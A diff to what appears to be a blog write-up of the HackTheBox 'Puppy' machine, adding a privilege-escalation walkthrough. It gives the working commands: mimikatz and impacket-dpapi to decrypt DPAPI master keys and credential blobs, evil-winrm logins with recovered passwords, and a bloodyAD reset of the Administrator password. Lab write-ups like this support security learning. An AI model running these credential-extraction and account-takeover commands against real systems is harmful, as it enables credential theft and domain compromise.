@@ -1,9 +1,9 @@
 ---
 title: HTB - Puppy (Medium)
 date: '2025-06-05'
-tags: ['machine', 'windows', 'Active Directory', 'GenericAll', 'Shadow-Credentials', 'time-skew', 'ESC16']
+tags: ['machine', 'windows', 'Active Directory', 'GenericWrite', 'GenericAll', 'dpapi-credentials']
 draft: false
-summary:  Placeholder   
+summary:  Starting with Situational Awareness, navigate through common ACEs misconfigurations, cracking a Keepass database file then escalating privileges by extracting credentials from Windows DPAPI revealing another ACE misconfiguration route that grants Domain Admin
 ---
 
 <TOCInline toc={props.toc} asDisclosure />
@@ -202,7 +202,7 @@ Observe that `ant.edwards` is a member of the `Senior Devs` group which has `Gen
 
 ## Gaining Access
 
-`adam.silver` is also a part of the WinRM group, we should be able to remotely access his account
+`adam.silver` is also a part of the `WinRM` group, we should be able to remotely access his account
 
 ![Description](/static/images/htb/windows/puppy/14.jpg)
 
@@ -233,6 +233,160 @@ Now, we access his account and get the user flag
 ---
 
 ## Privilege Escalation
+
+Running `whoami /priv` does not provide anything useful. I proceeded to upload `winpeas.exe`
+
+![Description](/static/images/htb/windows/puppy/18.jpg)
+
+There's an unusual hidden file in the `Desktop` folder
+
+![Description](/static/images/htb/windows/puppy/19.jpg)
+
+Looking throught the Winpeas results show that the hidden file has something to do with Data Protection API (DPAPI) which is an API that provides a method for symmetric encryption
+of data
+
+![Description](/static/images/htb/windows/puppy/20.jpg)
+
+According to this [Hacktricks page](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html), 
+we should be looking for any available master keys in which there is only 1 present at the moment:
+
+> [!TIP]
+> Check for master keys here:
+> ``` 
+> Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+> Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
+> Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+> Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
+> Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
+> Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
+> ```
+
+![Description](/static/images/htb/windows/puppy/24.jpg)
+
+Next, we need to find encrypted blobs which are encrypted data files which sometimes contain sensitive information
+
+> [!TIP]
+> Common users files protected are in:
+> ```
+> C:\Users\username\AppData\Roaming\Microsoft\Protect\*
+> C:\Users\username\AppData\Roaming\Microsoft\Credentials\*
+> C:\Users\username\AppData\Roaming\Microsoft\Vault\*
+> 
+> Check also changing \Roaming\ to \Local\ in the above paths.
+> ```
+
+![Description](/static/images/htb/windows/puppy/25.jpg)
+
+Now that we have the master key and the encrypted blob, we will utilize Mimikatz to decrypt the master key first
+
+```
+PS C:\Users\adam.silver\Documents> ./mimikatz.exe "dpapi::masterkey /in:C:\Users\adam.silver\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105\1038bdea-4935-41a8-a224-9b3720193c86 /sid:S-1-5-21-1487982659-1829050783-2281216199-1105 /password:Password123!" exit
+```
+
+Unfortunately, that didn't work :(
+
+![Description](/static/images/htb/windows/puppy/26.jpg)
+
+But that will be informational for later, in the `C:` drive there is a `Backups` directory. In it, a file called `site-backup-2024-12-30.zip`. After downloading it,
+we can see the source code of some webpage 
+
+![Description](/static/images/htb/windows/puppy/21.jpg)
+
+Nothing stands out except some harded-coded credentials in the `.bak` file
+
+![Description](/static/images/htb/windows/puppy/22.jpg)
+
+`steph.cooper:ChefSteph2025!`
+
+We can `Winrm` into his account. Proceed to upload `winpeas.exe`
+
+```
+❯ evil-winrm -i 10.10.11.70 -u steph.cooper -p ChefSteph2025!
+```
+
+![Description](/static/images/htb/windows/puppy/23.jpg)
+
+At the same DPAPI section, there were noticable information
+
+![Description](/static/images/htb/windows/puppy/27.jpg)
+
+Initially in `adam.silver`'s account there was 1 encrypted blob, but this time there's 2. One of them having the description, "Enterprise Credential Data".
+Also the other blob was the same as `adam.silver`'s. Possible shared data? maybe this time we can decrypt the master key using `steph.cooper`'s account as the master key
+is also present here.
+
+1'st blob: `DFBE70A7E5CC19A398EBF1B96859CE5D`  
+2'nd blob: 1C8D69EBE9A43E9DEBF6B5FBD48B521B9`
+
+```
+PS C:\Users\steph.cooper\Documents> ./mimikatz.exe "dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107/556a2412-1275-4ccf-b721-e6a0b4f90407 /sid:S-1-5-21-1487982659-1829050783-2281216199-1107 /passw
+ord:ChefSteph2025! /protected" exit
+```
+![Description](/static/images/htb/windows/puppy/28.jpg)
+
+Nice, we have decrypted the masterkey. Now, we can decrypt the encrypted blobs using the master key! I decrypted the first blob.
+
+```
+PS C:\Users\steph.cooper\Documents> ./mimikatz.exe "dpapi::cred /in:C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84" exit
+```
+
+We get a long output which isn't helpful. Continue decrypting the 2'nd blob.
+
+```
+PS C:\Users\steph.cooper\Documents> ./mimikatz.exe "dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84" exit
+```
+
+We get some juicy info
+
+![Description](/static/images/htb/windows/puppy/29.jpg)
+
+`steph.cooper_adm:FivethChipOnItsWay2025!`
+
+Then, I went back to Bloodhound to check permissions because I saw something interesting.
+
+![Description](/static/images/htb/windows/puppy/30.jpg)
+
+We have all these fun ACEs to play with but I just went for password change because I was a bit tired
+
+```
+❯ bloodyAD --host "puppy.htb" -u "steph.cooper_adm" -p 'FivethChipOnItsWay2025!' set password 'Administrator' 'Password123!'
+```
+
+![Description](/static/images/htb/windows/puppy/31.jpg)
+
+Finally just Winrm inside and get da root flag
+
+![Description](/static/images/htb/windows/puppy/32.jpg)
+
+---
+
+## Alternative
+
+I found another cool way to crack the Master Key and the encrypted blob. It's essentially the same method, but using the Impacket's dpapi tool, but to use that we needed to
+transfer the master key and blob and using `evil-winrm`'s download command does not work well. Instead transfer them from the target machine by starting an SMB share server,
+then run these commands
+
+```
+❯ impacket-dpapi masterkey -file 1038bdea-4935-41a8-a224-9b3720193c86 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password ChefSteph2025!
+```
+
+![Description](/static/images/htb/windows/puppy/33.jpg)
+
+
+Then decrypt the blob
+
+```
+❯ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+```
+
+![Description](/static/images/htb/windows/puppy/34.jpg)
+
+
+
+
+
+
+
+
 
 
 
